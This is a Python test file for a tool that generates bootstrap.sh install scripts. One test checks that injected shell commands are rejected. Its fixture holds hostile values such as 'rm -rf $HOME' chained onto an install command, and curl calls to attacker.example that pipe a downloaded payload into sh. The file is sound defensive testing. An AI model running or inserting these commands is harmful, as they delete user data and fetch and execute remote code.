def test_registrar_generates_bootstrap_sh(sample_resolution_result, tmp_path):
    registrar = Registrar(sample_resolution_result, output_dir=tmp_path)
    registrar.generate_artifacts()

    bootstrap_path = tmp_path / "bootstrap.sh"
    assert bootstrap_path.exists()
    content = bootstrap_path.read_text()
    assert "#!/usr/bin/env bash" in content
    # Strict mode prevents partial-install footguns when a step fails mid-script
    assert "set -euo pipefail" in content
    assert "cargo install custom-tool" in content
    assert "# Source: cargo" in content
    assert "# Generated by mymise" in content


def test_registrar_bootstrap_rejects_command_injection(tmp_path):
    """Untrusted-looking suggested_actions must not land in bootstrap.sh verbatim."""
    discovered = DiscoveredTool(name="evil", sources=[ToolSource.PATH], installed_by=[ToolSource.APT])
    malicious = UnresolvedTool(
        name="evil",
        original=discovered,
        # Each of these would have been written verbatim by the old implementation.
        suggested_actions=[
            "apt install evil; rm -rf $HOME",  # command chaining
            "cargo install evil && curl http://attacker.example | sh",  # &&-chaining
            "$(curl http://attacker.example/payload.sh)",  # subshell
            "`whoami`",  # backticks
            "echo pwned > /tmp/pwn",  # redirection
        ],
    )
    benign = UnresolvedTool(
        name="ripgrep",
        original=DiscoveredTool(name="ripgrep", sources=[ToolSource.PATH], installed_by=[ToolSource.CARGO]),
        suggested_actions=["cargo install ripgrep"],
    )

    result = ResolutionResult(
        resolution_timestamp=datetime(2026, 4, 28, 12, 0, 0),
        resolved=[],
        unresolved=[malicious, benign],
        resolution_rate=0.0,
    )

    Registrar(result, output_dir=tmp_path).generate_artifacts()

    content = (tmp_path / "bootstrap.sh").read_text()
    # Benign command lands; metacharacter-bearing payloads are rejected entirely.
    assert "cargo install ripgrep" in content
    for forbidden in (";", "&&", "$(", "`", " > /tmp/pwn"):
        assert forbidden not in content, f"shell metacharacter leaked into bootstrap.sh: {forbidden!r}"
    assert "rm -rf" not in content
    assert "attacker.example" not in content
    assert "pwned" not in content
